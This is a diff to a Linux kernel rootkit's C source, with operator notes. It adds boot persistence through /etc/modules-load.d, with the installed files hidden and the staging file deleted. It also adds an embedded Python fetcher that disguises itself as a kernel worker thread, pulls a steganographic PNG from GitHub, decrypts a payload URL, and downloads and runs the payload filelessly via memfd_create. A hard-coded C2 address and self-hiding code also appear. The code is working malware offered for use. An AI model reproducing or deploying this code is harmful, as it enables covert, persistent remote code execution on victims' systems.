@@ -42,9 +42,40 @@
  *   echo "hide_file <name>"   > /proc/rootkit_ctrl
  *   echo "unhide_file <name>" > /proc/rootkit_ctrl
  *
+ * Dead-drop resolver (stego PNG → payload URL → fileless Python exec):
+ *   On init, a kernel delayed_work fires after 5 seconds and calls
+ *   call_usermodehelper() to spawn python3 with an embedded fetcher script.
+ *   The script: (1) sleeps 60–300 s (random, to break timing correlation with
+ *   insmod); (2) downloads a PNG from STEGO_IMG_URL (e.g. a GitHub favicon);
+ *   (3) walks the PNG chunk list to find a tEXt chunk with keyword
+ *   "X-Payload"; (4) base64-decodes and XOR-decrypts the value using the
+ *   16-byte key baked into FETCHER_SCRIPT (must match stego_embed.py);
+ *   (5) fetches the Python payload from the recovered URL; (6) double-forks
+ *   and executes it fileless via memfd_create(2) + execve("/proc/self/fd/N").
+ *   The spawned process names itself "kworker/0:1H" via prctl(PR_SET_NAME)
+ *   to blend with kernel worker threads in ps output.
+ *   Operator workflow: run stego_embed.py to embed a payload URL into a PNG,
+ *   host the PNG (raw GitHub URL works), set STEGO_IMG_URL and PYTHON3_PATH
+ *   in this file, then rebuild.
+ *
+ * Persistence (modules-load.d):
+ *   On init, PERSIST_LOAD_PATH (the .ko the operator placed on disk) is copied
+ *   to /lib/modules/$(uname -r)/extra/PERSIST_KO_NAME via a /bin/sh helper,
+ *   depmod -a is run so modprobe can find it, and a one-line conf file is
+ *   written to /etc/modules-load.d/PERSIST_CONF_NAME (content: module name).
+ *   systemd-modules-load.service picks this up at next boot and runs
+ *   modprobe PERSIST_MODULE_NAME, re-loading all hooks automatically.
+ *   Both files (PERSIST_KO_NAME and PERSIST_CONF_NAME) are added to the
+ *   hidden filename list before the shell helper fires, so they are invisible
+ *   from the moment the getdents64 kretprobe is active.
+ *   The source file at PERSIST_LOAD_PATH is deleted after the copy to remove
+ *   the obvious staging artefact.
+ *   Operator: set PERSIST_LOAD_PATH to wherever insmod is run from, and
+ *   optionally rename PERSIST_MODULE_NAME to something less obvious.
+ *
  * Limitations:
- *   - No persistence: state and hooks are lost on reboot; /etc/hosts entries
- *     survive reboot but are no longer hidden (re-load the module).
+ *   - /etc/hosts entries survive reboot but are no longer hidden until the
+ *     module reloads (hooks gone); persistence via modules-load.d fixes this.
  *   - After self-hiding, rmmod cannot find the module; hooks survive until
  *     reboot (intentional — operator must reboot to fully unload).
  *   - /proc/<pid>/exe still points to the real binary for root processes.
@@ -53,6 +84,10 @@
  *   - If CONFIG_KPROBES=n the module will refuse to load.
  *   - pread64() and mmap() of /etc/hosts are not filtered.
  *   - kretprobe maxactive limits concurrent instances; excess calls are missed.
+ *   - call_usermodehelper requires python3 at PYTHON3_PATH; if absent, the
+ *     fetch silently fails (no retry).
+ *   - The "-c SCRIPT" argument to python3 is visible in /proc/<pid>/cmdline
+ *     until the process exec's the payload and replaces its argv.
  */
 
 #include <linux/init.h>
@@ -72,6 +107,8 @@
 #include <linux/fs.h>
 #include <linux/file.h>
 #include <linux/dcache.h>
+#include <linux/workqueue.h>
+#include <linux/kmod.h>
 #include <asm/unistd.h>
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
@@ -91,6 +128,61 @@ MODULE_VERSION("1.0");
 #define MAX_HIDDEN_FILES  64
 #define MAX_FILENAME_LEN  256
 #define KRP_MAXACTIVE     32
+
+/* ── persistence config (set before building) ────────────────────────────── */
+/* Full path where the operator places the .ko before running insmod */
+#define PERSIST_LOAD_PATH   "/tmp/ironveil.ko"
+/* Module name used for modprobe — change to something innocuous */
+#define PERSIST_MODULE_NAME "system_acl"
+/* Derived filenames (must stay in sync with module name) */
+#define PERSIST_KO_NAME     PERSIST_MODULE_NAME ".ko"
+#define PERSIST_CONF_NAME   PERSIST_MODULE_NAME ".conf"
+/* Shell script: copy .ko to kernel extra dir, depmod, write conf, erase source */
+#define PERSIST_SCRIPT \
+	"VER=$(uname -r)\n" \
+	"DEST=/lib/modules/$VER/extra/" PERSIST_KO_NAME "\n" \
+	"mkdir -p /lib/modules/$VER/extra\n" \
+	"if [ ! -f \"$DEST\" ]; then\n" \
+	"cp " PERSIST_LOAD_PATH " \"$DEST\"\n" \
+	"chmod 644 \"$DEST\"\n" \
+	"depmod -a 2>/dev/null\n" \
+	"rm -f " PERSIST_LOAD_PATH "\n" \
+	"fi\n" \
+	"echo " PERSIST_MODULE_NAME " > /etc/modules-load.d/" PERSIST_CONF_NAME "\n"
+
+/* ── dead-drop resolver config (set before building) ─────────────────────── */
+/* URL of the stego PNG hosted on a public service (e.g. raw.githubusercontent) */
+#define STEGO_IMG_URL  "https://raw.githubusercontent.com/OWNER/REPO/main/favicon.png"
+/* Absolute path to python3 on the target system */
+#define PYTHON3_PATH   "/usr/bin/python3"
+/* Embedded Python fetcher — XOR key must match STEGO_XOR_KEY in stego_embed.py */
+#define FETCHER_SCRIPT \
+	"import urllib.request,base64,os,ctypes,time,random\n" \
+	"ctypes.CDLL(None).prctl(15,b'kworker/0:1H',0,0,0)\n" \
+	"time.sleep(random.uniform(60,300))\n" \
+	"K=bytes([0x7a,0x19,0xe3,0x4c,0xb2,0x88,0x5f,0x3d,0xa1,0xc7,0x06,0xf4,0x9e,0x52,0xd0,0x2b])\n" \
+	"def xd(d):return bytes(b^K[i%len(K)]for i,b in enumerate(d))\n" \
+	"try:\n" \
+	" r=urllib.request.urlopen('" STEGO_IMG_URL "',timeout=15).read()\n" \
+	" i=8;pu=None\n" \
+	" while i+12<=len(r):\n" \
+	"  l=int.from_bytes(r[i:i+4],'big');t=r[i+4:i+8];d=r[i+8:i+8+l]\n" \
+	"  if t==b'tEXt' and 0 in d:\n" \
+	"   s=d.index(0)\n" \
+	"   if d[:s]==b'X-Payload':pu=xd(base64.b64decode(d[s+1:])).decode();break\n" \
+	"  i+=12+l\n" \
+	" if pu:\n" \
+	"  py=urllib.request.urlopen(pu,timeout=15).read()\n" \
+	"  if os.fork()==0:\n" \
+	"   os.setsid()\n" \
+	"   if os.fork()==0:\n" \
+	"    libc=ctypes.CDLL(None)\n" \
+	"    fd=libc.memfd_create(b'kworker',0)\n" \
+	"    os.write(fd,py)\n" \
+	"    os.execve('/proc/self/fd/'+str(fd),['/proc/self/fd/'+str(fd)],{'HOME':'/root','PATH':'/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'})\n" \
+	"   os._exit(0)\n" \
+	"  os.wait()\n" \
+	"except:pass\n"
 
 #define C2_IP            "87.106.187.97"
 #define HOSTS_MARKER     C2_IP
@@ -520,6 +612,34 @@ static void inject_hosts(void)
 	filp_close(filp, NULL);
 }
 
+/* ── persistence install ──────────────────────────────────────────────────── */
+static void persist_install(void)
+{
+	static char *argv[] = { "/bin/sh", "-c", PERSIST_SCRIPT, NULL };
+	static char *envp[] = {
+		"HOME=/root",
+		"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+		NULL
+	};
+	fname_add(PERSIST_KO_NAME);
+	fname_add(PERSIST_CONF_NAME);
+	call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
+}
+
+/* ── dead-drop payload fetch ──────────────────────────────────────────────── */
+static struct delayed_work fetch_work;
+
+static void do_payload_fetch(struct work_struct *work)
+{
+	static char *argv[] = { PYTHON3_PATH, "-c", FETCHER_SCRIPT, NULL };
+	static char *envp[] = {
+		"HOME=/root",
+		"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+		NULL
+	};
+	call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
+}
+
 /* ── module init / exit ───────────────────────────────────────────────────── */
 static int __init rootkit_init(void)
 {
@@ -561,12 +681,17 @@ static int __init rootkit_init(void)
 	proc_create(CTRL_PROC_NAME, 0222, NULL, &ctrl_fops);
 #endif
 
+	persist_install();
 	module_selfhide();
+
+	INIT_DELAYED_WORK(&fetch_work, do_payload_fetch);
+	schedule_delayed_work(&fetch_work, msecs_to_jiffies(5000));
 	return 0;
 }
 
 static void __exit rootkit_exit(void)
 {
+	cancel_delayed_work_sync(&fetch_work);
 	unregister_kretprobe(&rp_kill);
 	unregister_kretprobe(&rp_gd64);
 	unregister_kretprobe(&rp_read);
